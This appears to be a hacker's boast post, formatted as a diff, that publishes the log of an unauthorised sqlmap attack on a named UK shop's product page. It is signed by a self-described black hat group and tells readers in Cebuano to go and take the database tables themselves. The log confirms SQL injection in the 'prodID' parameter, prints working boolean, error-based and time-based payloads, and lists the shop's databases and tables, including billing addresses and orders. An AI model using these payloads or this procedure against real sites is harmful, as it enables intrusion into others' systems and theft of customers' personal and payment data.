@@ -1,0 +1,302 @@
+                   
+                      Target Site: http://www.forgeriesonline.co.uk/products.php?prodID=14
+                            
+Hacked By: Anon Leyte
+           Black Hat Hackers Ormoc
+ 
+                           scroll down naa sa ubos ang mga database
+                           kamo nalang bahala sa pag kuha sa database tables 
+
+
+root@Kravchenko:~# 
+[07:27:07] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3' from file '/usr/share/sqlmap/txt/user-agents.txt'
+[07:27:08] [INFO] testing connection to the target URL
+[07:27:15] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[07:27:16] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
+y
+[07:27:38] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
+[07:27:50] [CRITICAL] WAF/IPS/IDS identified as 'Generic (Unknown)'
+[07:27:50] [WARNING] WAF/IPS/IDS specific response can be found in '/tmp/sqlmapTre0GX3434/sqlmapresponse-pffq3o'. If you know the details on used protection please report it along with specific response to 'dev@sqlmap.org'
+are you sure that you want to continue with further target testing? [y/N] y
+[07:27:55] [WARNING] please consider usage of tamper scripts (option '--tamper')
+[07:27:55] [INFO] testing if the target URL content is stable
+[07:27:55] [INFO] target URL content is stable
+[07:27:55] [INFO] testing if GET parameter 'prodID' is dynamic
+[07:27:56] [INFO] confirming that GET parameter 'prodID' is dynamic
+[07:27:57] [INFO] GET parameter 'prodID' is dynamic
+[07:27:58] [INFO] heuristics detected web page charset 'ascii'
+[07:27:58] [INFO] heuristic (basic) test shows that GET parameter 'prodID' might be injectable (possible DBMS: 'MySQL')
+[07:27:59] [INFO] testing for SQL injection on GET parameter 'prodID'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[07:28:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[07:28:03] [WARNING] reflective value(s) found and filtering out
+[07:28:07] [INFO] GET parameter 'prodID' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="In")
+[07:28:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[07:28:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[07:28:09] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[07:28:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[07:28:11] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[07:28:12] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[07:28:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[07:28:14] [INFO] GET parameter 'prodID' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
+[07:28:14] [INFO] testing 'MySQL inline queries'
+[07:28:15] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[07:28:15] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)
+[07:28:31] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[07:28:32] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[07:28:36] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
+[07:28:37] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
+[07:28:39] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[07:28:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[07:28:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[07:30:21] [WARNING] turning off pre-connect mechanism because of connection time out(s)
+[07:30:28] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
+[07:33:55] [INFO] GET parameter 'prodID' appears to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
+[07:33:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[07:33:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[07:33:59] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[07:34:16] [INFO] target URL appears to have 3 columns in query
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+
+[07:39:08] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[07:39:08] [INFO] testing 'MySQL UNION query (90) - 1 to 20 columns'
+[07:39:38] [INFO] testing 'MySQL UNION query (90) - 21 to 40 columns'
+[07:40:31] [INFO] testing 'MySQL UNION query (90) - 41 to 60 columns'
+[07:41:16] [INFO] testing 'MySQL UNION query (90) - 61 to 80 columns'
+[07:42:11] [INFO] testing 'MySQL UNION query (90) - 81 to 100 columns'
+GET parameter 'prodID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 161 HTTP(s) requests:
+---
+Parameter: prodID (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: prodID=14 AND 7475=7475
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: prodID=14 AND (SELECT 6614 FROM(SELECT COUNT(*),CONCAT(0x716a6a6271,(SELECT (ELT(6614=6614,1))),0x7171786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: prodID=14 OR SLEEP(100)
+---
+[07:43:16] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 4.4.9, Apache
+back-end DBMS: MySQL >= 5.0
+[07:43:16] [INFO] fetching database names
+[07:43:30] [INFO] used SQL query returns 2 entries
+[07:43:32] [INFO] retrieved: information_schema
+[07:43:36] [INFO] retrieved: db300987912
+[07:43:36] [INFO] fetching tables for databases: 'db300987912, information_schema'
+[07:43:38] [INFO] used SQL query returns 66 entries
+[07:43:40] [INFO] retrieved: information_schema
+[07:43:46] [INFO] retrieved: CHARACTER_SETS
+[07:43:50] [INFO] retrieved: information_schema
+[07:43:52] [INFO] retrieved: COLLATIONS
+[07:43:55] [INFO] retrieved: information_schema
+[07:43:56] [INFO] retrieved: COLLATION_CHARACTER_SET_APPLICABILITY
+[07:43:58] [INFO] retrieved: information_schema
+[07:44:02] [INFO] retrieved: COLUMNS
+[07:44:04] [INFO] retrieved: information_schema
+[07:44:06] [INFO] retrieved: COLUMN_PRIVILEGES
+[07:44:08] [INFO] retrieved: information_schema
+[07:44:10] [INFO] retrieved: ENGINES
+[07:44:12] [INFO] retrieved: information_schema
+[07:44:13] [INFO] retrieved: EVENTS
+[07:44:15] [INFO] retrieved: information_schema
+[07:44:19] [INFO] retrieved: FILES
+[07:44:25] [INFO] retrieved: information_schema
+[07:44:31] [INFO] retrieved: GLOBAL_STATUS
+[07:44:35] [INFO] retrieved: information_schema
+[07:44:38] [INFO] retrieved: GLOBAL_VARIABLES
+[07:44:43] [INFO] retrieved: information_schema
+[07:44:46] [INFO] retrieved: KEY_COLUMN_USAGE
+[07:44:48] [INFO] retrieved: information_schema
+[07:44:50] [INFO] retrieved: PARAMETERS
+[07:44:52] [INFO] retrieved: information_schema
+[07:44:54] [INFO] retrieved: PARTITIONS
+[07:44:55] [CRITICAL] unable to connect to the target URL ('Interrupted system call'). sqlmap is going to retry the request(s)
+[07:44:57] [INFO] retrieved: information_schema
+[07:45:05] [INFO] retrieved: PLUGINS
+[07:45:09] [INFO] retrieved: information_schema
+[07:45:11] [INFO] retrieved: PROCESSLIST
+[07:45:13] [INFO] retrieved: information_schema
+[07:45:15] [INFO] retrieved: PROFILING
+[07:45:17] [INFO] retrieved: information_schema
+[07:45:19] [INFO] retrieved: REFERENTIAL_CONSTRAINTS
+[07:45:22] [INFO] retrieved: information_schema
+[07:45:24] [INFO] retrieved: ROUTINES
+[07:45:26] [INFO] retrieved: information_schema
+[07:45:28] [INFO] retrieved: SCHEMATA
+[07:45:30] [INFO] retrieved: information_schema
+[07:45:32] [INFO] retrieved: SCHEMA_PRIVILEGES
+[07:45:37] [INFO] retrieved: information_schema
+[07:45:39] [INFO] retrieved: SESSION_STATUS
+[07:45:47] [INFO] retrieved: information_schema
+[07:45:49] [INFO] retrieved: SESSION_VARIABLES
+[07:45:51] [INFO] retrieved: information_schema
+[07:45:54] [INFO] retrieved: STATISTICS
+[07:45:55] [INFO] retrieved: information_schema
+[07:46:00] [INFO] retrieved: TABLES
+[07:46:03] [INFO] retrieved: information_schema
+[07:46:09] [INFO] retrieved: TABLESPACES
+[07:46:12] [INFO] retrieved: information_schema
+[07:46:14] [INFO] retrieved: TABLE_CONSTRAINTS
+[07:46:15] [INFO] retrieved: information_schema
+[07:46:17] [INFO] retrieved: TABLE_PRIVILEGES
+[07:46:21] [INFO] retrieved: information_schema
+[07:46:27] [INFO] retrieved: TRIGGERS
+[07:46:29] [INFO] retrieved: information_schema
+[07:46:33] [INFO] retrieved: USER_PRIVILEGES
+[07:46:35] [INFO] retrieved: information_schema
+[07:46:38] [INFO] retrieved: VIEWS
+[07:46:40] [INFO] retrieved: information_schema
+[07:46:44] [INFO] retrieved: INNODB_BUFFER_PAGE
+[07:46:46] [INFO] retrieved: information_schema
+[07:46:48] [INFO] retrieved: INNODB_TRX
+[07:46:50] [INFO] retrieved: information_schema
+[07:46:53] [INFO] retrieved: INNODB_BUFFER_POOL_STATS
+[07:46:58] [INFO] retrieved: information_schema
+[07:47:00] [INFO] retrieved: INNODB_LOCK_WAITS
+[07:47:02] [INFO] retrieved: information_schema
+[07:47:04] [INFO] retrieved: INNODB_CMPMEM
+[07:47:08] [INFO] retrieved: information_schema
+[07:47:10] [INFO] retrieved: INNODB_CMP
+[07:47:12] [INFO] retrieved: information_schema
+[07:47:14] [INFO] retrieved: INNODB_LOCKS
+[07:47:16] [INFO] retrieved: information_schema
+[07:47:17] [INFO] retrieved: INNODB_CMPMEM_RESET
+[07:47:20] [INFO] retrieved: information_schema
+[07:47:24] [INFO] retrieved: INNODB_CMP_RESET
+[07:47:26] [INFO] retrieved: information_schema
+[07:47:30] [INFO] retrieved: INNODB_BUFFER_PAGE_LRU
+[07:47:34] [INFO] retrieved: db300987912
+[07:47:36] [INFO] retrieved: billing_addresses
+[07:47:38] [INFO] retrieved: db300987912
+[07:47:40] [INFO] retrieved: cart_items
+[07:47:42] [INFO] retrieved: db300987912
+[07:47:46] [INFO] retrieved: cart_options
+[07:47:50] [INFO] retrieved: db300987912
+[07:47:52] [INFO] retrieved: comments
+[07:47:55] [INFO] retrieved: db300987912
+[07:47:57] [INFO] retrieved: delivery_addresses
+[07:48:02] [INFO] retrieved: db300987912
+[07:48:04] [INFO] retrieved: extras
+[07:48:06] [INFO] retrieved: db300987912
+[07:48:08] [INFO] retrieved: general_news
+[07:48:13] [INFO] retrieved: db300987912
+[07:48:18] [INFO] retrieved: images
+[07:48:20] [INFO] retrieved: db300987912
+[07:48:22] [INFO] retrieved: menu_items
+[07:48:25] [INFO] retrieved: db300987912
+[07:48:30] [INFO] retrieved: menus
+[07:48:32] [INFO] retrieved: db300987912
+[07:48:34] [INFO] retrieved: newsletter
+[07:48:38] [INFO] retrieved: db300987912
+[07:48:40] [INFO] retrieved: option_groups
+[07:48:42] [INFO] retrieved: db300987912
+[07:48:44] [INFO] retrieved: options
+[07:48:46] [INFO] retrieved: db300987912
+[07:48:48] [INFO] retrieved: options1
+[07:48:50] [INFO] retrieved: db300987912
+[07:48:52] [INFO] retrieved: options2
+[07:48:54] [INFO] retrieved: db300987912
+[07:48:58] [INFO] retrieved: options3
+[07:49:00] [INFO] retrieved: db300987912
+[07:49:02] [INFO] retrieved: orders
+[07:49:04] [INFO] retrieved: db300987912
+[07:49:07] [INFO] retrieved: other_pages
+[07:49:09] [INFO] retrieved: db300987912
+[07:49:11] [INFO] retrieved: patterns
+[07:49:14] [INFO] retrieved: db300987912
+[07:49:19] [INFO] retrieved: prices
+[07:49:21] [INFO] retrieved: db300987912
+[07:49:25] [INFO] retrieved: product_news
+[07:49:29] [INFO] retrieved: db300987912
+[07:49:31] [INFO] retrieved: products
+[07:49:34] [INFO] retrieved: db300987912
+[07:49:36] [INFO] retrieved: sizes
+[07:49:38] [INFO] retrieved: db300987912
+[07:49:40] [INFO] retrieved: styles
+[07:49:41] [INFO] retrieved: db300987912
+[07:49:44] [INFO] retrieved: testomonials
+[07:49:48] [INFO] retrieved: db300987912
+[07:49:50] [INFO] retrieved: types
+Database: db300987912
+[26 tables]
++---------------------------------------+
+| billing_addresses                     |
+| cart_items                            |
+| cart_options                          |
+| comments                              |
+| delivery_addresses                    |
+| extras                                |
+| general_news                          |
+| images                                |
+| menu_items                            |
+| menus                                 |
+| newsletter                            |
+| option_groups                         |
+| options                               |
+| options1                              |
+| options2                              |
+| options3                              |
+| orders                                |
+| other_pages                           |
+| patterns                              |
+| prices                                |
+| product_news                          |
+| products                              |
+| sizes                                 |
+| styles                                |
+| testomonials                          |
+| types                                 |
++---------------------------------------+
+
+Database: information_schema
+[40 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+root@Kravchenko:~# 
